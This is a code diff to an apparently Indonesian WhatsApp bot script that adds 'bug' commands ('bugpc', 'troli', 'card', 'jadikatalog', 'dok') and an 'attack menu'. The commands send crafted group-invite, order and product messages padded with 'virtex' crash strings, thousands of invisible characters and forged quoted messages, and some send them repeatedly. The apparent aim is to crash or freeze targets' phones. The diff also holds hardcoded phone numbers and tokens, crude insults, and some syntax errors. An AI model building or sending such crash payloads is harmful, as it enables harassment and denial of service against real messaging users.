@@ -21,6 +21,7 @@ const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
 const { color, bgcolor } = require('./lib/color')
 const { virtex1 } = require('./src/virtex1')
+const { virtex2 } = require('./src/virtex2')
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
 
 // read database
@@ -35,6 +36,8 @@ let tebakkalimat = db.data.game.kalimat = []
 let tebaklirik = db.data.game.lirik = []
 let tebaktebakan = db.data.game.tebakan = []
 let vote = db.data.others.vote = []
+
+virgam = fs.readFileSync(`./src/virgam.jpeg`)
 
 module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
     try {
@@ -3201,9 +3204,14 @@ let time1 = de.toLocaleDateString(locale, {hour: 'numeric', minute: 'numeric', s
 ⁙┃〲◦➛${prefix}ʙᴜɢᴠ1 [sᴀᴍᴘᴇ 11]
 ⁙┃〲◦➛${prefix}ʙᴜɢʙᴜᴛᴛᴏɴ
 ⁙┃〲◦➛${prefix}ʙᴜɢᴅᴏᴄ
-⁙┃〲◦➛${prefix}ᴛʀᴏʟɪ
+⁙┃〲◦➛${prefix}ᴛʀᴏʟɪ [card order]
 ⁙┃〲◦➛${prefix}ʙᴜɢʟɪsᴛ
 ⁙┃〲◦➛${prefix}ʙᴜɢʀᴇᴀᴄ
+⁙┃〲◦➛${prefix}bugpc [invite]
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
+⁙┃〲◦➛${prefix}
 ⁙┃▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 ⁙┃〲 *『 ᗩTTᗩᑕK ᗰᗴᑎᑌ 』*
 ⁙┃〲◦➛${prefix}sᴇɴᴅʀᴇᴀᴄ
@@ -3439,7 +3447,7 @@ hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fkon})
 break      
 case 'bugbutton': {
 let buttons = [
-{buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1(prefix)}`,}, type: 1}
+{buttonId: `Jembod`, buttonText:{displayText:`HANZ々OFC彡-${virtex1}`,}, type: 1}
                 ]
                 let buttonMessage = {
                     image: fs.readFileSync('./menu1.jpeg'),
@@ -3453,8 +3461,8 @@ let buttons = [
 ⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
 ⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
 ⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
-${virtex1(prefix)}`,
-                    footer: hisoka.user.name,
+${virtex2}`,
+                    footer: virtex2,
                     buttons: buttons,
                     headerType: 4
                 }
@@ -3465,14 +3473,14 @@ case 'sendbut':
                     if (!isCreator) throw mess.owner
                     if (!text) throw `MANA NOMERNYA KONTOL`
                  buttonspc = [
-                        {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: virtex1}, type: 1},
+                        {buttonId: `Jembod`, buttonText: {displayText: virtex1}, type: 1},
                         {buttonId: 'babaabbabababa', buttonText: {displayText: virtex1}, type: 1},
                         {buttonId: 'babababbababa', buttonText: {displayText: virtex1}, type: 1}
                       ]
                       
                     buttonMessagepc = {
-                          text: "HANZ々OFC彡",
-                          footerText: 'Pe',
+                          text: 'virtex1',
+                          footerText: 'virtex2',
                           buttons: buttonspc,
                           headerType: 1
                       }
@@ -3483,14 +3491,23 @@ case 'buglist':
 if (!isCreator) throw mess.owner
 kontolputralist = [
                 {
-                title: `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 ${ranzmods} ${buttonvirus}`,
+                title: `virtex1`,
                 rows: [
-                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
-                {title: ranzmods, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
+                {title: virtex1, rowId: `Jembod`, description: `HANZ々OFC彡`},
+                {title: virtex1, rowId: `Jembod`, description: `HANZ々OFC彡`}
                 ]
                 }
                 ]
-                hisoka.sendListMsg(m.chat, `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, hisoka.user.name, `Hay Ngentod`, `🔥 𝐓𝐁𝐂 - 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, kontolputralist, m)
+                hisoka.sendListMsg(m.chat, `HANZ々OFC彡 -${virtex1}`, hisoka.user.name, `💤HANZ々OFC彡💤\n
+╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+┃╭┈─────────────⩵꙰ཱི࿐
+┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
+╰•͙✩̣̣̣̣
+⁙┃〲◦➛Link Sc: https://bit.ly/3vJZJ7n
+⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
+⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
+⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
+⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n${virtex2}`, kontolputralist, m)
 break                    
 case 'sendreac' : {
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -3785,6 +3802,121 @@ if(text.endsWith("@g.us")) {
         }
 }
 break
+case 'dok':
+if (!isCreator) throw mess.owner
+y1 = fs.readFileSync('./pirtex/iphone.mp3')
+tebece.sendMessage(m.chat, {document: y1 fileName:`${virtex1}.txt`, quoted: m})
+break
+case 'card':
+argzi = arg.split("|")
+if (Number(argzi[1]) >= 10) return m.reply('Kebanyakan Delay Wea ku su!')
+if (isNaN(argzi[1])) return m.reply(`harus berupa angka`)
+for (let i = 0; i < argzi[1]; i++){
+njir = await generateWAMessageFromContent(m.chat,{"orderMessage": {"orderId": "150453297177375", "sellerJid": "6285731811079@s.whatsapp.net", "thumbnail": fs.readFileSync('./media/virgam.jpeg'), "itemCount": 2022, "status": "INQUIRY", "surface": "CATALOG", "message": `${argzi[0]}`, "orderTitle": "6283144394823@s.whatsapp.net", "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==" }, "totalAmount1000": "Rp 99.99999999999999999999", "totalCurrencyCode": "IDR", "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted: {
+	key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
+}
+}
+}, contextInfo:{}}) 
+	hisoka.relayMessage(m.chat, njir.message, { messageId: njir.key.id,})
+break
+case 'troli': {
+	if (!isCreator) return
+     troli = generateWAMessageFromContent(m.chat,{
+	"orderMessage": {
+	"orderId": "1852737648397912",
+	"thumbnail": virgam,
+	"itemCount": 2023,
+	"status": "INQUIRY",
+	"surface": "CATALOG",
+	"message": `P`,
+	"orderTitle": `P`, // 
+	"sellerJid": "5491133536405@s.whatsapp.net",
+	"token": "AR7/2zjjptlTa5L01fa9w1r5YlEYzOfAdW75CBBiFko14g=="
+	}
+	},{quoted: {
+	key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
+}
+}
+}, contextInfo:{}}) 
+	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
+	}
+	break
+case 'bugpc':
+if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
+main = generateWAMessageFromContent(m.chat,{
+"groupInviteMessage": {
+"groupJid": "6283144394823@g.us",
+"inviteCode": "UkJdqTXupAtmDwo4",
+"inviteExpiration": "1643553084",
+"invitetime": "1643293887000",
+"groupName": `HANZ々OFC彡🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${virtex1}️️`,
+"thumbnail": thumb,           //INI JUGA GW TAMBAHIN VIRTEX BIAR GANAS WKWK ASu
+"caption": `BUG INVITE🎭 BY : HANZ々OFC彡`,
+"contextInfo": {
+"forwardingScore": 150,
+"isForwarded": true
+}
+}
+}, {quoted: {
+	key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
+}
+}
+}, contextInfo:{}}) 
+hisoka.relayMessage(m.chat, main.message, { messageId: main.key.id,})
+	}
+	break
+case 'jadikatalog':
+imeg = hisoka.message.imageMessage
+let main = generateWAMessageFromContent(m.chat,{
+"productMessage": {
+"product": {
+"productImage": imeg, 
+"title": `${q}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`,
+"description": `cok️️`,
+"currencyCode": "USD",
+"priceAmount1000": "0",
+"productImageCount": 1,
+"firstImageId": 1,
+"contentText": `p cok`,           
+"footerText": `P cok`,
+"salePriceAmount1000": "99.99999999999999999999",         
+"retailerId": `KATALOG NEW ERA`,
+"url": "Haris Ganteng"                       
+},
+"businessOwnerJid": "6283144394823@s.whatsapp.net",
+}
+}, { quoted: {
+	key : {
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+message: {
+liveLocationMessage: {
+caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
+jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
+}
+}
+}, contextInfo:{}}) 
+hisoka.relayMessage(m.chat, main.message, { messageId: main.key.id,})
+	}
+	break
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
